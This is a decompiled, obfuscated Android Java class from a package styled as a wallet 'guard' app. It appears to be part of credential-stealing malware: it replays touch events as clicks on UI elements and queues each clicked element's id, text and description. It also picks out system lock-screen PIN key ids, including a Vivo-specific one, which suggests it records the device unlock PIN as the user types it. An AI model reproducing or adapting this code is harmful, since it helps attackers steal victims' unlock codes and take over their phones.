package com.guard.wallet.helper;

import android.graphics.Rect;
import android.util.Log;
import android.view.MotionEvent;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.req.ListenPropResponse;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Predicate;

public final class p implements Predicate {
   public final int a;
   public final Object b;

   @Override
   public final boolean test(Object var1) {
      int var2 = this.a;
      boolean var5 = true;
      boolean var6 = true;
      switch (var2) {
         case 0:
            UiObject var8 = (UiObject)var1;
            if (var8 != null) {
               Rect var16 = var8.boundsInScreen();
               var1 = var8.boundsInParent();
               label61:
               if (var16 != null && var1 != null) {
                  if (var1.width() > var16.width()) {
                     var2 = (var1.width() - var16.width()) / 2;
                  } else {
                     var2 = 0;
                  }

                  int var3;
                  if (var1.height() > var16.height()) {
                     var3 = (var1.height() - var16.height()) / 2;
                  } else {
                     var3 = 0;
                  }

                  if (var2 <= 0) {
                     var1 = var16;
                     if (var3 <= 0) {
                        break label61;
                     }
                  }

                  var16.left -= var2;
                  var16.right += var2;
                  var16.top -= var3;
                  var16.bottom += var3;
                  var1 = var16;
               } else {
                  var1 = null;
               }

               if (var1 != null) {
                  Point var17 = new Point(var1.exactCenterX(), var1.exactCenterY());
                  MotionEvent var9 = (MotionEvent)this.b;
                  if (var1.contains((int)var9.getX(), (int)var9.getY())) {
                     boolean var19 = var6;
                     if (var8.click()) {
                        com.guard.wallet.plug.f var13 = r.c;
                        var13.c.add(var17);
                        r.f = r.f + 1;
                        LinkedList var18 = new LinkedList();
                        if (!a1.q.B(var8.id())) {
                           var18.add(new ListenPropResponse(r.f, "id", var8.id(), System.nanoTime()));
                        }

                        if (!a1.q.B(var8.text())) {
                           var18.add(new ListenPropResponse(r.f, "text", var8.text(), System.nanoTime()));
                        }

                        if (!a1.q.B(var8.desc())) {
                           var18.add(new ListenPropResponse(r.f, "desc", var8.desc(), System.nanoTime()));
                        }

                        var19 = var6;
                        if (!var18.isEmpty()) {
                           var19 = var6;
                           if (!var18.isEmpty()) {
                              var13.b.addAll(var18);
                              var19 = var6;
                           }

                           return var19;
                        }
                     }

                     return var19;
                  }
               }
            }

            return false;
         default:
            ListenPropResponse var7 = (ListenPropResponse)var1;
            if (!a1.q.B(var7.getValue())) {
               ConcurrentLinkedQueue var10 = com.guard.wallet.plug.c.a;
               Log.e("com.guard.wallet.plug.c", var7.getValue());
               if (var7.getValue().startsWith("com.android.systemui:id/key")) {
                  return var5;
               }

               if (var7.getValue().startsWith("com.android.systemui:id/VivoPinkey")) {
                  return var5;
               }
            }

            return false;
      }
   }
}
